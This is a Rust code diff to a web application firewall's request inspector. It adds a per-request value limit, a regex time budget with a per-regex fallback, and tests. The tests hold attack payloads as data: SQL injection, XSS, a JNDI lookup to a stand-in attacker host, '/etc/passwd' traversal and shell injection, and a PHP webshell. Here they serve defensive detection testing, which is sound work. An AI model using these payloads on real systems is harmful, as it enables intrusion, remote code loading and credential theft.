@@ -1,6 +1,8 @@
 //! Walks a request (path, query, headers, cookies, body) and scores every value.
 
+use std::cell::Cell;
 use std::collections::BTreeMap;
+use std::time::{Duration, Instant};
 
 use regex::{Regex, RegexSet, RegexSetBuilder};
 
@@ -15,6 +17,23 @@ use crate::multipart;
 use crate::shell::Shell;
 use crate::sql::Sql;
 use crate::ssrf::Ssrf;
+
+/// Values inspected per request at most. Past this the request gets an
+/// `inspection_limit` finding (7), so padding can't push a payload past an uninspected
+/// limit, and an attacker can't buy unbounded work with one request.
+const MAX_VALUES: usize = 4096;
+
+/// Time a request may spend in the combined indicator automaton before its remaining
+/// values are matched one regex at a time (see [`Inspector::indicator_matches`]).
+const SET_BUDGET: Duration = Duration::from_millis(2);
+
+/// Per-request inspection state.
+#[derive(Default)]
+struct Scan {
+    values: Cell<usize>,
+    set_time: Cell<Duration>,
+    limited: Cell<bool>,
+}
 
 /// Indicators that are ignored in the URL path.
 const PATH_EXEMPT: &[&str] = &["dom_sink", "js_cookie_domain", "generic_event_handler"];
@@ -73,6 +92,8 @@ pub struct HttpRequest<'a> {
 
 pub struct Inspector {
     set: RegexSet,
+    /// The same indicators one by one, for random-looking input (see `indicator_matches`).
+    each: Vec<Regex>,
     meta: Vec<(AttackClass, &'static str, f64)>,
     jndi_only: Vec<bool>,
     comments: Regex,
@@ -107,6 +128,10 @@ impl Inspector {
             .expect("WAF patterns compile");
         Self {
             set,
+            each: ind
+                .iter()
+                .map(|i| Regex::new(&format!("(?s){}", i.pattern)).expect("WAF patterns compile"))
+                .collect(),
             meta: ind.iter().map(|i| (i.class, i.name, i.weight)).collect(),
             jndi_only: ind
                 .iter()
@@ -133,11 +158,35 @@ impl Inspector {
     /// Scores one value. `form` = `+` means space (query strings, form bodies).
     /// Returns the strongest finding, if any reaches `min_score`.
     pub fn inspect_value(&self, location: &str, raw: &str, form: bool) -> Option<Finding> {
-        self.inspect_value_filtered(location, raw, form, false)
+        self.inspect_value_filtered(&Scan::default(), location, raw, form, false)
+    }
+
+    /// `inspect_value` within one request's budget.
+    fn scan_value(&self, scan: &Scan, location: &str, raw: &str, form: bool) -> Option<Finding> {
+        self.inspect_value_filtered(scan, location, raw, form, false)
+    }
+
+    /// Indexes of the indicators matching `v`. The combined `RegexSet` is fastest on
+    /// ordinary text, but on random-looking input (many distinct characters, little
+    /// repetition) its lazy DFA keeps building new states and falls back to a slow engine:
+    /// ~8 ms for 8 KiB of random punctuation instead of ~20 µs for prose. One regex at a
+    /// time stays under ~0.4 ms there. Both give the same matches; only the speed differs.
+    fn indicator_matches(&self, v: &str, per_regex: bool, jndi_only: bool) -> Vec<usize> {
+        if per_regex {
+            self.each
+                .iter()
+                .enumerate()
+                .filter(|(i, r)| (!jndi_only || self.jndi_only[*i]) && r.is_match(v))
+                .map(|(i, _)| i)
+                .collect()
+        } else {
+            self.set.matches(v).into_iter().collect()
+        }
     }
 
     fn inspect_value_filtered(
         &self,
+        scan: &Scan,
         location: &str,
         raw: &str,
         form: bool,
@@ -146,6 +195,12 @@ impl Inspector {
         if raw.is_empty() {
             return None;
         }
+        let n = scan.values.get();
+        if n >= MAX_VALUES {
+            scan.limited.set(true);
+            return None;
+        }
+        scan.values.set(n + 1);
         let raw = truncate(raw, self.max_value_len);
         let decoded = decode(raw, form);
         let mut scores: BTreeMap<AttackClass, (f64, Vec<&'static str>)> = BTreeMap::new();
@@ -195,8 +250,14 @@ impl Inspector {
         }
         let n_plain = variants.len();
         variants.extend(base64_variants(&kept_case));
-        for v in &variants {
-            for idx in self.set.matches(v).into_iter() {
+        let per_regex = scan.set_time.get() >= SET_BUDGET || variants.iter().any(|v| diverse(v));
+        let started = (!per_regex).then(Instant::now);
+        for (vi, v) in variants.iter().enumerate() {
+            // identical variants (no comments, no lookups: the usual case) are scanned once
+            if variants[..vi].contains(v) {
+                continue;
+            }
+            for idx in self.indicator_matches(v, per_regex, jndi_only) {
                 if jndi_only && !self.jndi_only[idx] {
                     continue;
                 }
@@ -216,6 +277,9 @@ impl Inspector {
                 }
                 add(class, name, w);
             }
+        }
+        if let Some(t) = started {
+            scan.set_time.set(scan.set_time.get() + t.elapsed());
         }
         // Word lists: decoded value, comment-stripped value and base64 decodings.
         let mut lexicon_inputs: Vec<&String> = vec![&decoded, &variants[0]];
@@ -294,6 +358,7 @@ impl Inspector {
     /// Inspects path, query parameters, cookies, user agent, referer, other headers
     /// (Log4Shell lookups only) and the body (form, JSON, XML, text, multipart).
     pub fn inspect(&self, req: &HttpRequest) -> Inspection {
+        let scan = Scan::default();
         let mut out = Inspection::default();
         let mut push = |f: Option<Finding>| {
             if let Some(f) = f {
@@ -304,13 +369,13 @@ impl Inspector {
             Some((p, q)) => (p, Some(q)),
             None => (req.path_and_query, None),
         };
-        push(self.inspect_value("path", path, false));
+        push(self.scan_value(&scan, "path", path, false));
         let mut names: Vec<String> = Vec::new();
         if let Some(q) = query {
             for (k, v) in form_pairs(q) {
                 names.push(decode_name(k).to_ascii_lowercase());
-                push(self.inspect_value("query-name", k, true));
-                push(self.inspect_value(&format!("query:{}", decode_name(k)), v, true));
+                push(self.scan_value(&scan, "query-name", k, true));
+                push(self.scan_value(&scan, &format!("query:{}", decode_name(k)), v, true));
             }
         }
         for (name, value) in req.headers {
@@ -321,15 +386,15 @@ impl Inspector {
                 // applications log and reflect these (second-order SQLi, stored XSS)
                 | "x-forwarded-for" | "x-real-ip" | "true-client-ip" | "x-client-ip"
                 | "forwarded" | "origin" => {
-                    push(self.inspect_value(&format!("header:{n}"), value, false))
+                    push(self.scan_value(&scan, &format!("header:{n}"), value, false))
                 }
                 "cookie" => {
                     for part in value.split(';') {
                         let (k, v) = part.split_once('=').unwrap_or(("", part));
-                        push(self.inspect_value(&format!("cookie:{}", k.trim()), v.trim(), true));
+                        push(self.scan_value(&scan, &format!("cookie:{}", k.trim()), v.trim(), true));
                     }
                 }
-                _ => push(self.inspect_value_filtered(&format!("header:{n}"), value, false, true)),
+                _ => push(self.inspect_value_filtered(&scan, &format!("header:{n}"), value, false, true)),
             }
         }
         if !req.body.is_empty() {
@@ -338,14 +403,23 @@ impl Inspector {
                 .starts_with("multipart/")
                 .then(|| req.content_type.and_then(multipart::boundary))
                 .flatten()
-                .and_then(|b| self.inspect_multipart(req.body, &b, &mut names));
+                .and_then(|b| self.inspect_multipart(&scan, req.body, &b, &mut names));
             match multipart {
                 Some(found) => out.findings.extend(found),
-                None => self.inspect_body(req.body, &ct, &mut names, &mut out.findings),
+                None => self.inspect_body(&scan, req.body, &ct, &mut names, &mut out.findings),
             }
         }
         if let Some(f) = self.session_fixation(&names, req.headers) {
             out.findings.push(f);
+        }
+        if scan.limited.get() {
+            out.findings.push(Finding {
+                class: ProtocolViolation,
+                score: 7.0,
+                location: "request".to_string(),
+                indicators: vec!["inspection_limit"],
+                sample: format!("more than {MAX_VALUES} values"),
+            });
         }
         out
     }
@@ -355,7 +429,14 @@ impl Inspector {
     /// Without a content type, or with one this function doesn't know, the body is still
     /// inspected: many frameworks parse JSON or form bodies whatever the declared type,
     /// so skipping the body would let one header switch the WAF off.
-    fn inspect_body(&self, raw: &[u8], ct: &str, names: &mut Vec<String>, out: &mut Vec<Finding>) {
+    fn inspect_body(
+        &self,
+        scan: &Scan,
+        raw: &[u8],
+        ct: &str,
+        names: &mut Vec<String>,
+        out: &mut Vec<Finding>,
+    ) {
         let body = body::decode(raw, ct);
         if let Some((indicator, score)) = body.anomaly {
             let charset = body::charset(ct).unwrap_or_default();
@@ -371,15 +452,15 @@ impl Inspector {
         if ct.starts_with("application/x-www-form-urlencoded") {
             for (k, v) in form_pairs(text) {
                 names.push(decode_name(k).to_ascii_lowercase());
-                out.extend(self.inspect_value("body-name", k, true));
-                out.extend(self.inspect_value(&format!("body:{}", decode_name(k)), v, true));
+                out.extend(self.scan_value(scan, "body-name", k, true));
+                out.extend(self.scan_value(scan, &format!("body:{}", decode_name(k)), v, true));
             }
         } else if ct.contains("json") {
-            if !self.inspect_json(text, names, out) {
-                out.extend(self.inspect_value("body", text, false));
+            if !self.inspect_json(scan, text, names, out) {
+                out.extend(self.scan_value(scan, "body", text, false));
             }
         } else if ct.contains("xml") || ct.starts_with("text/") || ct.starts_with("multipart/") {
-            out.extend(self.inspect_value("body", text, false));
+            out.extend(self.scan_value(scan, "body", text, false));
         } else if !body.transcoded && multipart::is_binary(raw) {
             // a raw file upload (`PUT /shell.php`): only server code hidden in it
             if let Some(indicator) = multipart::embedded_code(raw) {
@@ -393,23 +474,29 @@ impl Inspector {
             }
         } else {
             let t = text.trim_start();
-            let json =
-                (t.starts_with('{') || t.starts_with('[')) && self.inspect_json(text, names, out);
+            let json = (t.starts_with('{') || t.starts_with('['))
+                && self.inspect_json(scan, text, names, out);
             if !json {
-                out.extend(self.inspect_value("body", text, false));
+                out.extend(self.scan_value(scan, "body", text, false));
             }
         }
     }
 
     /// Walks `text` as JSON, collecting top-level keys for session-fixation detection.
     /// `false` if it doesn't parse.
-    fn inspect_json(&self, text: &str, names: &mut Vec<String>, out: &mut Vec<Finding>) -> bool {
+    fn inspect_json(
+        &self,
+        scan: &Scan,
+        text: &str,
+        names: &mut Vec<String>,
+        out: &mut Vec<Finding>,
+    ) -> bool {
         match serde_json::from_str::<serde_json::Value>(text) {
             Ok(v) => {
                 if let Some(m) = v.as_object() {
                     names.extend(m.keys().take(1000).map(|k| k.to_ascii_lowercase()));
                 }
-                self.walk_json(&v, "json", out, 0);
+                self.walk_json(scan, &v, "json", out, 0);
                 true
             }
             Err(_) => false,
@@ -421,6 +508,7 @@ impl Inspector {
     /// server code, plus structural evasions. `None` if the body doesn't parse.
     fn inspect_multipart(
         &self,
+        scan: &Scan,
         body: &[u8],
         boundary: &str,
         names: &mut Vec<String>,
@@ -446,13 +534,13 @@ impl Inspector {
         for p in &m.parts {
             let field = truncate(&p.name, 64);
             names.push(field.to_ascii_lowercase());
-            out.extend(self.inspect_value("body-name", &p.name, false));
+            out.extend(self.scan_value(scan, "body-name", &p.name, false));
             let text = || String::from_utf8_lossy(p.body).into_owned();
             if let Some(file) = &p.filename {
                 let mut inds: Vec<(&'static str, f64)> = Vec::new();
                 // `filename*` is preferred, but a server may store `filename`: check both
                 for name in std::iter::once(file).chain(p.alt_filename.iter()) {
-                    out.extend(self.inspect_value(&format!("filename:{field}"), name, false));
+                    out.extend(self.scan_value(scan, &format!("filename:{field}"), name, false));
                     let mut found = multipart::filename_indicators(name);
                     // files a site never accepts by upload (wp-config.php, .bashrc, config.yml)
                     let stored = format!("/{}", multipart::normalize_filename(name));
@@ -479,7 +567,7 @@ impl Inspector {
                         inds.push((n, 8.0));
                     }
                 } else {
-                    out.extend(self.inspect_value(&format!("body:{field}"), &text(), false));
+                    out.extend(self.scan_value(scan, &format!("body:{field}"), &text(), false));
                 }
                 out.extend(finding(
                     MaliciousUpload,
@@ -493,13 +581,13 @@ impl Inspector {
                 .is_some_and(|c| c.contains("json"))
             {
                 match serde_json::from_slice::<serde_json::Value>(p.body) {
-                    Ok(v) => self.walk_json(&v, &format!("json.{field}"), &mut out, 0),
+                    Ok(v) => self.walk_json(scan, &v, &format!("json.{field}"), &mut out, 0),
                     Err(_) => {
-                        out.extend(self.inspect_value(&format!("body:{field}"), &text(), false))
+                        out.extend(self.scan_value(scan, &format!("body:{field}"), &text(), false))
                     }
                 }
             } else {
-                out.extend(self.inspect_value(&format!("body:{field}"), &text(), false));
+                out.extend(self.scan_value(scan, &format!("body:{field}"), &text(), false));
             }
         }
         Some(out)
@@ -544,32 +632,59 @@ impl Inspector {
         })
     }
 
-    fn walk_json(&self, v: &serde_json::Value, path: &str, out: &mut Vec<Finding>, depth: usize) {
+    fn walk_json(
+        &self,
+        scan: &Scan,
+        v: &serde_json::Value,
+        path: &str,
+        out: &mut Vec<Finding>,
+        depth: usize,
+    ) {
         if depth > 32 {
             return;
         }
         match v {
             serde_json::Value::String(s) => {
-                if let Some(f) = self.inspect_value(path, s, false) {
+                if let Some(f) = self.scan_value(scan, path, s, false) {
                     out.push(f);
                 }
             }
             serde_json::Value::Array(a) => {
                 for (i, x) in a.iter().enumerate().take(1000) {
-                    self.walk_json(x, &format!("{path}[{i}]"), out, depth + 1);
+                    self.walk_json(scan, x, &format!("{path}[{i}]"), out, depth + 1);
                 }
             }
             serde_json::Value::Object(m) => {
                 for (k, x) in m.iter().take(1000) {
-                    if let Some(f) = self.inspect_value(&format!("{path}-key"), k, false) {
+                    if let Some(f) = self.scan_value(scan, &format!("{path}-key"), k, false) {
                         out.push(f);
                     }
-                    self.walk_json(x, &format!("{path}.{k}"), out, depth + 1);
+                    self.walk_json(scan, x, &format!("{path}.{k}"), out, depth + 1);
                 }
             }
             _ => {}
         }
     }
+}
+
+/// Long and made of many different characters: the shape that makes the combined
+/// indicator automaton slow (prose of the same length uses far fewer characters).
+fn diverse(v: &str) -> bool {
+    if v.len() < 256 {
+        return false;
+    }
+    let mut seen = [false; 256];
+    let mut distinct = 0;
+    for b in v.bytes() {
+        if !seen[b as usize] {
+            seen[b as usize] = true;
+            distinct += 1;
+            if distinct >= 40 {
+                return true;
+            }
+        }
+    }
+    false
 }
 
 fn truncate(s: &str, max: usize) -> &str {
@@ -597,6 +712,89 @@ fn decode_name(k: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn both_indicator_engines_find_the_same_matches() {
+        let w = Inspector::new();
+        let mut x: u64 = 42;
+        let mut random = |len: usize| -> String {
+            (0..len)
+                .map(|_| {
+                    x ^= x << 13;
+                    x ^= x >> 7;
+                    x ^= x << 17;
+                    (b' ' + (x % 95) as u8) as char
+                })
+                .collect::<String>()
+                .to_lowercase()
+        };
+        let mut values: Vec<String> = [
+            "1' union select username,password from users--",
+            "<img src=x onerror=alert(1)>",
+            "${jndi:ldap://evil.example/a}",
+            "../../../../etc/passwd",
+            ";cat /etc/passwd",
+            "{{7*7}}",
+            "{\"$where\": \"sleep(100)\"}",
+            "<?php system($_get['c']); ?>",
+            "the quick brown fox jumps over the lazy dog",
+        ]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+        values.extend((0..20).map(|i| random(64 + i * 97)));
+        for v in &values {
+            for jndi_only in [false, true] {
+                let mut set = w.indicator_matches(v, false, jndi_only);
+                if jndi_only {
+                    set.retain(|&i| w.jndi_only[i]);
+                }
+                assert_eq!(set, w.indicator_matches(v, true, jndi_only), "{v:?}");
+            }
+        }
+    }
+
+    #[test]
+    fn too_many_values_are_flagged_not_skipped_silently() {
+        let w = Inspector::new();
+        let query: String = (0..MAX_VALUES).map(|i| format!("a{i}=1&")).collect();
+        let target = format!("/?{query}x=%3Cscript%3Ealert(1)%3C%2Fscript%3E");
+        let r = w.inspect(&HttpRequest {
+            path_and_query: &target,
+            headers: &[],
+            content_type: None,
+            body: b"",
+        });
+        let limit = r
+            .findings
+            .iter()
+            .find(|f| f.indicators == ["inspection_limit"]);
+        assert_eq!(limit.map(|f| f.score), Some(7.0));
+        // under the limit nothing is flagged
+        let r = w.inspect(&HttpRequest {
+            path_and_query: "/?a=1&b=2",
+            headers: &[],
+            content_type: None,
+            body: b"",
+        });
+        assert!(r.findings.is_empty());
+    }
+
+    #[test]
+    fn multibyte_shell_argument_does_not_panic() {
+        // used to slice a `&str` inside 'é' (`a[1..2]`) and panic the connection's task
+        let w = Inspector::new();
+        for v in [";cat -é", "a;id -ü", "x|cat -€"] {
+            let _ = w.inspect_value("query:x", v, true);
+        }
+        let headers = vec![("user-agent".to_string(), "Mozilla;cat -é".to_string())];
+        let _ = w.inspect(&HttpRequest {
+            path_and_query: "/search?q=%3Bcat%20-%C3%A9",
+            headers: &headers,
+            content_type: None,
+            body: b"",
+        });
+    }
 
     #[test]
     fn locations_and_body_types() {
